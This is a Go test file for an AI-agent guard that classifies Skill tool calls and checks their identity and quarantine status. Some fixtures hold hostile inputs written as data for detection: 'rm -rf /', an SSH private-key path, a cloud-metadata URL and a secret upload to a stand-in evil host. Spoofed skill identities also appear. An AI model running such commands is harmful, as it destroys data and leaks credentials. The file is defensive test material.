package agentguard

import (
	"context"
	"testing"
	"time"

	"github.com/yangjiyj/aiguard/packages/shared-go/protection"
)

// skillBlockingPolicy 把 Skill 相关防护项和全部敏感目标防护项配成阻断（2.9.22 起没有内置底线）。
func skillBlockingPolicy() *EffectivePolicy {
	return &EffectivePolicy{Mode: ModeStrict, Protections: blockingProtections(protection.GroupAgentTarget, protection.GroupSkill)}
}

func TestClassifyToolTypeRecognizesSkillToolsWithoutSubstringFalsePositives(t *testing.T) {
	tests := map[string]string{
		"Skill":          ToolTypeSkill,
		"use_skill":      ToolTypeSkill,
		"load-skill":     ToolTypeSkill,
		"activateSkill":  ToolTypeSkill,
		"skills/install": ToolTypeSkill,
		"reskill_model":  ToolTypeUnknown,
		"Read":           ToolTypeFile,
		"WebFetch":       ToolTypeNetwork,
		"mcp__git__push": ToolTypeMCP,
	}
	for name, want := range tests {
		if got := ClassifyToolType(name); got != want {
			t.Errorf("ClassifyToolType(%q)=%q want %q", name, got, want)
		}
	}
}

func TestExtractSkillIdentityFromFixedTopLevelArguments(t *testing.T) {
	identity := ExtractSkillIdentity(map[string]any{
		"skill":       " PDF Tools ",
		"version":     "1.2.0",
		"bundle_hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"source":      "https://example.invalid/pdf",
	})
	if identity.CanonicalName != "pdf-tools" || identity.Version != "1.2.0" ||
		identity.BundleHash == "" || identity.Source != "https://example.invalid/pdf" || identity.Issue != "" {
		t.Fatalf("unexpected identity: %+v", identity)
	}
}

func TestExtractSkillIdentityRejectsNestedOrConflictingIdentity(t *testing.T) {
	for name, args := range map[string]map[string]any{
		"nested only": {"request": map[string]any{"skill": "attacker", "version": "9", "bundle_hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"}},
		"conflicting nested": {
			"skill": "approved", "version": "1", "bundle_hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
			"input": map[string]any{"skill": "actual"},
		},
	} {
		t.Run(name, func(t *testing.T) {
			identity := ExtractSkillIdentity(args)
			if identity.Issue == "" {
				t.Fatalf("untrusted identity shape was accepted: %+v", identity)
			}
		})
	}
}

func TestExtractSkillIdentityDoesNotMixUnrelatedNestedMetadata(t *testing.T) {
	approvedHash := "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	identity := ExtractSkillIdentity(map[string]any{
		"a_unrelated": map[string]any{
			"version":     "attacker-version",
			"bundle_hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
			"source":      "https://evil.invalid/unrelated",
		},
		"skill":       "pdf",
		"version":     "1.0.0",
		"bundle_hash": approvedHash,
		"source":      "git+https://example.invalid/pdf",
	})
	if identity.CanonicalName != "pdf" || identity.Version != "1.0.0" ||
		identity.BundleHash != approvedHash || identity.Source != "git+https://example.invalid/pdf" {
		t.Fatalf("identity mixed unrelated nested metadata: %+v", identity)
	}
}

func TestDeclaredSkillSourceRequiresCredentialFreeHTTPS(t *testing.T) {
	for _, value := range []string{
		"http://example.invalid/repo",
		"https://user:secret@example.invalid/repo",
		"https://example.invalid/repo?token=secret",
		"file:///tmp/repo",
	} {
		if got := sanitizeDeclaredSkillSource(value); got != "" {
			t.Errorf("unsafe source %q sanitized to %q", value, got)
		}
	}
	if got := sanitizeDeclaredSkillSource("git+https://example.invalid/repo"); got != "git+https://example.invalid/repo" {
		t.Fatalf("safe git source rejected: %q", got)
	}
}

// 隔离/撤销是管理员在 Skill 页上的配置，结论带 ConfiguredEnforcement（原 AdmissionFloor 已删除）。
func TestAnalyzeSkillInvocationAdmissionIsStructural(t *testing.T) {
	tests := []struct {
		status         SkillAdmissionStatus
		mode           Mode
		wantRaw        DecisionAction
		wantEff        DecisionAction
		wantConfigured bool
	}{
		{status: SkillAdmissionApproved, mode: ModeStrict, wantRaw: DecisionAllow, wantEff: DecisionAllow},
		// Hotfix: unverified/unknown versions are recorded, never confirmed or blocked.
		{status: SkillAdmissionUnverified, mode: ModeStrict, wantRaw: DecisionAudit, wantEff: DecisionAudit},
		{status: SkillAdmissionUnknown, mode: ModeStrict, wantRaw: DecisionAudit, wantEff: DecisionAudit},
		// Quarantine/revocation are administrator actions and are enforced.
		{status: SkillAdmissionQuarantined, mode: ModeStrict, wantRaw: DecisionBlock, wantEff: DecisionBlock, wantConfigured: true},
		{status: SkillAdmissionRevoked, mode: ModeStrict, wantRaw: DecisionBlock, wantEff: DecisionBlock, wantConfigured: true},
		{status: SkillAdmissionQuarantined, mode: ModeObserve, wantRaw: DecisionBlock, wantEff: DecisionAudit, wantConfigured: true},
		{status: SkillAdmissionRevoked, mode: ModeAudit, wantRaw: DecisionBlock, wantEff: DecisionAudit, wantConfigured: true},
	}
	for _, tt := range tests {
		t.Run(string(tt.status)+"/"+string(tt.mode), func(t *testing.T) {
			decision := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{
				ToolName: "use_skill",
				ToolType: ToolTypeSkill,
				Arguments: map[string]any{
					"skill":       "pdf",
					"version":     "1.0.0",
					"bundle_hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
				},
				SkillAdmission:        tt.status,
				Mode:                  tt.mode,
				ConfirmChannelEnabled: true,
			})
			if decision.RawDecision != tt.wantRaw || decision.EffectiveDecision != tt.wantEff || decision.ConfiguredEnforcement != tt.wantConfigured {
				t.Fatalf("decision=%+v want raw=%s effective=%s configured_enforcement=%t", decision, tt.wantRaw, tt.wantEff, tt.wantConfigured)
			}
		})
	}
}

func TestAnalyzeSkillInvocationReusesDangerousBehaviorAnalyzers(t *testing.T) {
	tests := []struct {
		name string
		args map[string]any
	}{
		{name: "command", args: map[string]any{"skill": "ops", "input": map[string]any{"command": "rm -rf /"}}},
		{name: "credential file", args: map[string]any{"skill": "reader", "input": map[string]any{"path": "/home/app/.ssh/id_rsa"}}},
		{name: "metadata", args: map[string]any{"skill": "fetcher", "input": map[string]any{"url": "http://169.254.169.254/latest/meta-data"}}},
		{name: "secret egress", args: map[string]any{"skill": "sender", "input": map[string]any{"url": "https://evil.example/upload", "body": "api_key=canary-test-secret-fixture"}}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tt.args["version"] = "1.0.0"
			tt.args["bundle_hash"] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
			input := ToolCallAnalysisInput{
				ToolName:       "use_skill",
				ToolType:       ToolTypeSkill,
				Arguments:      tt.args,
				SkillAdmission: SkillAdmissionApproved,
				Mode:           ModeStrict,
				Policy:         skillBlockingPolicy(),
			}
			// 2.9.22：嵌套的危险行为是防护项命中；配成阻断时照拦。
			decision := AnalyzeToolCall(context.Background(), input)
			if decision.RawDecision != DecisionBlock || decision.EffectiveDecision != DecisionBlock {
				t.Fatalf("dangerous nested skill behavior must be detected and blocked when configured: %+v", decision)
			}
			if len(decision.Evidence) == 0 {
				t.Fatalf("dangerous decision lacks safe evidence: %+v", decision)
			}
			// 默认配置：照样识别（防护项命中），只告警不拦。
			input.Policy = nil
			byDefault := AnalyzeToolCall(context.Background(), input)
			if byDefault.EffectiveDecision != DecisionAudit || !byDefault.NotificationRequired || byDefault.ProtectionItem == "" {
				t.Fatalf("default settings must detect and alert: %+v", byDefault)
			}
		})
	}
}

func TestSkillQuarantineHoldsOverAllowRulesAndExceptions(t *testing.T) {
	policy := &EffectivePolicy{
		ID: "policy", Name: "unsafe allow", PolicyVersion: "v1",
		Mode: ModeStrict, DefaultAction: DecisionAllow, ConfirmChannelEnabled: true,
		Rules: []PolicyRule{{
			ID: "allow-skill", ToolPattern: "skill.*", Action: DecisionAllow, Enabled: true,
		}},
		Exceptions: []PolicyException{{
			ID: "exception", RuleID: "allow-skill", TargetPattern: "",
			Decision: DecisionAllow, ExpiresAt: time.Now().Add(time.Hour),
		}},
	}
	analyze := func(status SkillAdmissionStatus) Decision {
		decision := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{
			ToolName: "use_skill", ToolType: ToolTypeSkill,
			Arguments: map[string]any{
				"skill": "pdf", "version": "1.0.0",
				"bundle_hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
			},
			SkillAdmission: status, Mode: ModeStrict, Policy: policy,
		})
		if matchingPolicyException(policy.Exceptions, decision, "") == nil {
			t.Fatal("admission-floor fixture must exercise its named exception")
		}
		return decision
	}
	// 2.9.22：隔离是管理员配置的阻断，指向放行规则的例外放不开它（原来准入底线落为确认）。
	if decision := analyze(SkillAdmissionQuarantined); decision.EffectiveDecision != DecisionBlock || !decision.ConfiguredEnforcement {
		t.Fatalf("a quarantined Skill was downgraded by policy or exception: %+v", decision)
	}
	// 指向隔离本身的例外是管理员明确放开它。
	policy.Exceptions = []PolicyException{{
		ID: "release-quarantine", RuleID: reasonSkillVersionQuarantined, Decision: DecisionAudit, ExpiresAt: time.Now().Add(time.Hour),
	}}
	released := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{
		ToolName: "use_skill", ToolType: ToolTypeSkill,
		Arguments: map[string]any{
			"skill": "pdf", "version": "1.0.0",
			"bundle_hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		},
		SkillAdmission: SkillAdmissionQuarantined, Mode: ModeStrict, Policy: policy,
	})
	if released.EffectiveDecision != DecisionAudit || released.EffectiveReason != effectiveReasonExceptionDowngrade || released.ConfiguredEnforcement {
		t.Fatalf("an exception naming the quarantine must release it: %+v", released)
	}
}

func TestMalformedOrConflictingSkillIdentityIsAuditedInObserveMode(t *testing.T) {
	decision := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{
		ToolName: "use_skill", ToolType: ToolTypeSkill,
		Arguments: map[string]any{
			"skill": "approved", "version": "1.0.0",
			"bundle_hash": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
			"input":       map[string]any{"skill": "actual"},
		},
		SkillAdmission: SkillAdmissionApproved, Mode: ModeObserve, Policy: skillBlockingPolicy(),
	})
	// 2.9.22：身份冲突是防护项 skill.identity_invalid 的命中；配成阻断时观察模式也只记 would-block。
	if decision.RawDecision != DecisionBlock || decision.EffectiveDecision != DecisionAudit || decision.ProtectionItem != "skill.identity_invalid" {
		t.Fatalf("conflicting Skill identity did not preserve evidence under observe mode: %+v", decision)
	}
}

func TestAnalyzeSkillInvocationMissingIdentityIsRecordedOnly(t *testing.T) {
	decision := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{
		ToolName: "Skill", ToolType: ToolTypeSkill, Arguments: map[string]any{},
		SkillAdmission: SkillAdmissionApproved, Mode: ModeStrict,
	})
	if decision.RawDecision != DecisionAudit || decision.Reason != "skill_identity_incomplete" {
		t.Fatalf("missing identity must be recorded without inheriting approved status: %+v", decision)
	}
}

// Claude Code's Skill tool sends only {skill, args}. In protect mode it must
// be forwarded (recorded), not held for confirmation or blocked.
func TestClaudeCodeSkillCallIsNotBlockedInProtectMode(t *testing.T) {
	for _, status := range []SkillAdmissionStatus{SkillAdmissionUnverified, SkillAdmissionUnknown, SkillAdmissionApproved} {
		decision := AnalyzeToolCall(context.Background(), ToolCallAnalysisInput{
			ToolName: "Skill", ToolType: ToolTypeSkill,
			Arguments:             map[string]any{"skill": "npu300-debug", "args": "SliceTranspose strict --gsan-list abort"},
			SkillAdmission:        status,
			Mode:                  ModeStrict,
			ConfirmChannelEnabled: true,
		})
		if decision.EffectiveDecision == DecisionConfirm || decision.EffectiveDecision == DecisionBlock || decision.ConfiguredEnforcement {
			t.Fatalf("status=%s: Claude Code Skill call must not be held or blocked: %+v", status, decision)
		}
	}
	// Dangerous nested behavior inside a Skill call is a protection-item hit:
	// enforced when skill.dangerous_command is configured to block, alerted by default.
	input := ToolCallAnalysisInput{
		ToolName: "Skill", ToolType: ToolTypeSkill,
		Arguments:      map[string]any{"skill": "ops", "input": map[string]any{"command": "rm -rf /"}},
		SkillAdmission: SkillAdmissionUnverified, Mode: ModeStrict, Policy: skillBlockingPolicy(),
	}
	decision := AnalyzeToolCall(context.Background(), input)
	if decision.EffectiveDecision != DecisionBlock {
		t.Fatalf("dangerous nested Skill command must stay blocked when configured: %+v", decision)
	}
	input.Policy = nil
	if byDefault := AnalyzeToolCall(context.Background(), input); byDefault.EffectiveDecision != DecisionAudit || !byDefault.NotificationRequired {
		t.Fatalf("dangerous nested Skill command must alert and allow by default: %+v", byDefault)
	}
}
